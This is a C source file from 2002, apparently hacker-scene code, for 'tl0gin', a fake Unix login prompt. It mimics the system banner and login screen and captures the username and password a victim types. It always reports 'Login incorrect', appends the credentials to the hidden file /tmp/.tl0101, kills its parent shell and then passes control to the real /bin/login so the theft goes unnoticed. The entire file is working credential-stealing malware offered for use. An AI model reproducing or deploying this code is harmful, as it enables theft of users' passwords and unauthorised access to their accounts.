/* tl0gin 0.1 (c)oded by m4rc3l0 in 11/09/2002(putz)	*
 *							*
 * Greetz: BashX, roadhouse, sinner, decodi, r0ot, hts,	*
 * midnight, behael, dacker, seed, m4st, mor_PH_eus,	*
 * eSc2, anjinh0, bionatus..				*
 * #DNH, #ESFINGE, #FEANOR at BRASNET			*
 *							*
 * Mail-me: m4rc3l0rlz@yahoo.com.br			*/
    

#include <stdio.h>
#include <stdlib.h>
#include <string.h> 
#include <signal.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/utsname.h>

 
/* Error */
#define ERROR1 "Login incorrect"

/* Arquive */
#define ARQUI "/tmp/.tl0101"

/* Others */
#define MAX 500
#define ERRO -1 
#define LOGIN "/bin/login"

void banner();
void loga();
void retorna();
int pega_info();
int grava_arq(char login[100], char passwd[100]);

char sys_name[100];
char sys_release[100];

int main()
{
    FILE *fp;

    signal(SIGINT, retorna);
    signal(SIGSTOP, retorna);
    signal(SIGQUIT, retorna);

    loga();
    
    return(0);
}

void loga() {
    int pid;
    char login[MAX], passwd[MAX], esconde[MAX], hostname[MAX];
    char *pass;
    
    pid = getppid();
    gethostname(hostname, sizeof(hostname));

    for(;;) {
	for(;;) {

	    PRIMEIRO:
	    banner();
	    
	    SEGUNDO:
	    printf("%s login: ", hostname); 
	    fflush(stdout);
	    gets(login);

	    if(strcmp(login, "") != 0)
		break;
	    else
		goto PRIMEIRO;
	}

	    pass = (char *)getpass ("Password: ");
	    printf("%s\n\n", ERROR1);
	    	    
	    if(strlen(login) >= 3)
		break;
	    else
		goto SEGUNDO;
	}
	
	grava_arq(login, pass);
	
	kill(pid, 9);
	execl(LOGIN, "", NULL);
}

int pega_info() {
    struct utsname info;

    if(uname(&info) == -1) {
	perror("uname");
	return -1;
    }

    sprintf(sys_name, "%s", info.sysname);
    sprintf(sys_release, "%s", info.release);
}
    
int grava_arq(char login[100], char passwd[100]) {
    FILE *fp;
    
    if((fp = fopen(ARQUI, "a")) != NULL) {
	fprintf(fp, "Login: %s\tPassword: %s\n", login, passwd);
	fclose(fp);
	return 0;
    }
    else 
	return -1;
}

void banner() {
    printf("\033[2J");
    printf("\033[2;1H");
    pega_info();
    printf("%s %s\n\n", sys_name, sys_release);
}

void retorna() {
    return;
}
    